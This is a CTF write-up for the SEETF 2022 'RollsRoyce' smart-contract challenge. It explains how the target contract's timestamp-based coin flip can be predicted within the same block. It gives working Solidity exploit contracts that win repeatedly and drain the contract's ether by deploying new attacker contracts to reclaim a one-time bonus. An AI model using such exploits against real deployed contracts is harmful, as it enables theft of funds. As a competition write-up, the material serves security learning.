## SEETF 2022 Rolls Royce Writeup

> This is a writeup for [SEETF 2022](https://play.seetf.sg/) which I participated in as a member of [DistributedLivelock](https://ctftime.org/team/187094) team. You can find my other writeups for this CTF [here](https://blog.opliko.dev/series/seetf-2022)

# Introduction

RollsRoyce is the smart contract challenge that received the least solves during the CTF and it's not hard to guess that it might have something to do with the fact it involves guessing and randomness. Or does it really?

EDIT: this apparently was an unintended solution. I guess not having any experience with exploiting Solidity gave me a different perspective on this challenge :)

#### Challenge description:
> Let's have some fun and win some money and hopefully buy a Rolls-Royce!

#### Challenge author: AtlanticBase

# Setup

The full guide to connecting to the environment can be found [here](https://github.com/Social-Engineering-Experts/ETH-Guide), but the TL;DR is that we need to install MetaMask, connect to the SEETF test network and create an account there, then get some funds via [their ETH faucet](http://awesome.chall.seetf.sg:40001/) and then finally connect to the challenge server with `nc` and following the steps there to deploy the contract.

To interact with the network and edit the code I found it easiest to use the [Remix IDE](https://remix.ethereum.org/) in the browser.

While for Bojour running on production immediately was preferable, here I recommend starting off with a javascript VM that Remix even has selected by default, since everything will work faster and you can use the debugger to understand what's happening inside the EVM easily. Just compile the contract and deploy it there:
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654465695693/xbF1uc74V.png align="center")

# What is our goal

In all smart contract challenges the goal is getting `isSolved()` function of the deployed smart contract to return `true`. The full code can be retrieved from the SEETF server for this challenge:
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RollsRoyce {
    enum CoinFlipOption {
        HEAD,
        TAIL
    }

    address private bettingHouseOwner;
    address public currentPlayer;
    CoinFlipOption userGuess;
    mapping(address => uint) playerConsecutiveWins;
    mapping(address => bool) claimedPrizeMoney;
    mapping(address => uint) playerPool;

    constructor() payable {
        bettingHouseOwner = msg.sender;
    }

    receive() external payable {}

    function guess(CoinFlipOption _guess) external payable {
        require(currentPlayer == address(0), "There is already a player");
        require(msg.value == 1 ether, "To play it needs to be 1 ether");

        currentPlayer = msg.sender;
        depositFunds(msg.sender);
        userGuess = _guess;
    }

    function revealResults() external {
        require(
            currentPlayer == msg.sender,
            "Only the player can reveal the results"
        );

        CoinFlipOption winningOption = flipCoin();

        if (userGuess == winningOption) {
            playerConsecutiveWins[currentPlayer] =
                playerConsecutiveWins[currentPlayer] +
                1;
        } else {
            playerConsecutiveWins[currentPlayer] = 0;
        }
        currentPlayer = address(0);
    }

    function flipCoin() private view returns (CoinFlipOption) {
        return
            CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function viewWins(address _addr) public view returns (uint) {
        return playerConsecutiveWins[_addr];
    }

    function depositFunds(address _to) internal {
        playerPool[_to] += msg.value;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }

    function withdrawPrizeMoney(address _to) public payable {
        require(
            msg.sender == _to,
            "Only the player can withdraw the prize money"
        );
        require(
            playerConsecutiveWins[_to] >= 3,
            "You need to win 3 or more consecutive games to claim the prize money"
        );

        if (playerConsecutiveWins[_to] >= 3) {
            uint prizeMoney = playerPool[_to];
            playerPool[_to] = 0;
            sendValue(payable(_to), prizeMoney);
        }
    }

    function withdrawFirstWinPrizeMoneyBonus() external {
        require(
            !claimedPrizeMoney[msg.sender],
            "You have already claimed the first win bonus"
        );
        playerPool[msg.sender] += 1 ether;
        withdrawPrizeMoney(msg.sender);
        claimedPrizeMoney[msg.sender] = true;
    }

    function isSolved() public view returns (bool) {
        // Return true if the game is solved
        return address(this).balance == 0;
    }
}
```
The condition here is a very realistic one - we need to drain the casino of all its money.

By reading the code we can see how it works. The user calls the `guess` function with a guess of the coin flip and sends exactly 1 ether along with it. Then they need to call `revealResults` which will select a random value for the coin flip and if the user guessed correctly, increment their number of consecutive wins. Otherwise it'll reset it to zero.

The guess function, however, does something else in addition to storing the guess: it calls `depositFunds` which adds the value of the original message - which we saw has to be exactly 1 ether - to player win pool.

To get our prize money we can call `withdrawPrizeMoney`, and if we have more than 3 consecutive wins, it'll pay us back the amount of money in our pool. You might see an issue now - isn't our pool exactly what we paid in? Yup, this casino was basically made to be impossible to earn money at. At beast you can get back what you paid in, and it's not likely even that will happen.

Thankfully, there is one last function left: `withdrawFirstWinPrizeMoneyBonus` - this one adds one to our pool and withdraws the money (again, only if we have more than 3 consecutive wins). This is the only way to earn anything here, but since we're not supposed to do that, we can only use it once.

So TL;DR, with great luck, we can earn 1 ether. And when we're deploying the contract via the SEETF server it starts with 5 ether.

Ideally then, we need to bypass two security measure:
1. the randomness
2. limitation on earnings

# NSRNG: Not-So Random Number Generator

Let's start from the first one then. The function for coin flipping seems a bit complex:
```
function flipCoin() private view returns (CoinFlipOption) {
    return
        CoinFlipOption(
            uint(
                keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
            ) % 2
        );
}
```
But really all it does is get a bit out of the current block timestamp XORed with a constant.

Now, just using the timestamp for randomness should immediately raise a red flag. If you know ethereum a bit, you might know that miners can potentially manipulate it.

But we're not mining here, so it's safe from us, right? Well, let's consider what this timestamp is for: the block.

So, if another contract is called in the same block, it gets the same timestamp.

We can exploit that quite easily by writing our own contract targeting this one then:
```solidity
contract PerfectGuesser {
    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }
    function guessCorrectly(address payable target) public payable {
        require(msg.value == 1 ether, "To play it needs to be 1 ether");
        RollsRoyce.CoinFlipOption result = flipCoin();
        RollsRoyce(target).guess{value: 1 ether}(result);
        RollsRoyce(target).revealResults();
    }
}
```
Since the `flipCoin` in the target contract function is private, we can just copy it from the source and add a qualifier to tell the compiler we're using the same enum for values.

If we then deploy that contract in the VM we can simply call the `guessCorrectly` function with the RollsRoyce contract address as the parameter while sending 1 ether along:
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654467318642/EW-LL3CFm.png align="center")
If we then call `viewWins` function on the RollsRoyce contract with our contract address as the parameter we see that it was indeed correct:
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654467379800/9tiywQc2B.png align="center")
We can run it a few more times to ensure it's not a fluke...
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654467438998/xbIqSy0Um.png align="center")
And yup, it sure does work. But we can't yet withdraw money and it's quite manual.

# Getting money back

The easiest way to "fix" our contract is to just add a small loop to guess 3 times and then use `withdrawFirstWinPrizeMoneyBonus`.

Let's do that then. Since the contract function will always be executed on the same block we don't need to care about changes in the flip value.
To get money back I added a separate function, but it can easily be merged. We also need `receive` for the transfer to succeed, and for ease of use I added a function to return the balance of the contract or target and one to potentially transfer the money to an address we control, but it's not needed for the CTF.
```solidity
contract PerfectGuesser {
    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }
    function guessCorrectly(address payable target) public payable {
        require(msg.value >= 3 ether, "To guess you need 3 ether");
        for (uint i=0;i<3;i++) {
            RollsRoyce.CoinFlipOption result = flipCoin();
            RollsRoyce(target).guess{value: 1 ether}(result);
            RollsRoyce(target).revealResults();
        }
    }
    function withdrawPrizeMoney(address payable _target) public {
        RollsRoyce(_target).withdrawFirstWinPrizeMoneyBonus();
    }
    receive() external payable {}
    function getBackOurMoney(address payable recipient, uint256 amount) public {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    function getTargetBalance(address payable target) public view returns (uint256) {
        return target.balance;
    }
}
```
A lot of the code is just copied from the original contract - so there isn't really any Solidity knowledge required here.

If we deploy the contract we can now give it 3 ether to guess:
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654468259921/Med5G90l2.png align="center")

And after withdrawing our money we can see that our balance is now 4 ether, and RollsRoyce has also went down from 5 to 4.
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654468356120/1pd6cDvw3.png align="center")

But remember that the only way to earn was the first prize bonus? As the name suggests, if we repeat our calls we just get an error, since we already claimed it:
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654468441731/YHjz1ky13.png align="center")

But at this point we have everything we need. We can just deploy 5 of these contract and use each once to withdraw the 5 ether the casino has at the start.

I'm lazy though, so I think it's a good idea to spend more time and effort on automating that! We could do so by using a small and cheap program to deploy the five contracts, but I also like spending my cryptocurrencies on wasting electricity, so let's just implement that in another contract:

```solidity
contract EmptyTheCasino {
    function grabAllMoney(address payable target) public payable {
        require(msg.value >= 3 ether, "To guess you need 3 ether");
        while (target.balance>0) {
            PerfectGuesser guesser = new PerfectGuesser();
            guesser.guessCorrectly{value: 3 ether}(target);
            guesser.withdrawPrizeMoney(target);
            guesser.getBackOurMoney(payable(address(this)), 4 ether);
        }
    }
    receive() external payable {}
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    function getBackOurMoney(address payable recipient, uint256 amount) public {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }
}
```

It simply does all the steps we were doing manually until the target contract runs out of ether. So now it'll work fine even if the casino was really rich :)
The only step we didn't do previously is getting the money back from the malicious contract - here we need it to not have to spend 3 times as much ether as we're getting back.

We can quickly check on the VM that it works and then deploy on the SEETF testnet.

# Finishing up

Now we can just provide it with 3 ehter it needs...
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654469550700/bK9bit4pR.png align="center")
And after the transaction confirms we have 8 ether in our control, while RollsRoyce is left with nothing
![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654469627145/e0_C9Mzpo.png align="center")

Now all that remains is grabbing the flag:

![nc connection to server which returns the flag: `SEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}` ](https://cdn.hashnode.com/res/hashnode/image/upload/v1654469657028/fWb47J-oR.png align="center")



> This is a writeup for [SEETF 2022](https://play.seetf.sg/) which I participated in as a member of [DistributedLivelock](https://ctftime.org/team/187094) team. You can find my other writeups for this CTF [here](https://blog.opliko.dev/series/seetf-2022)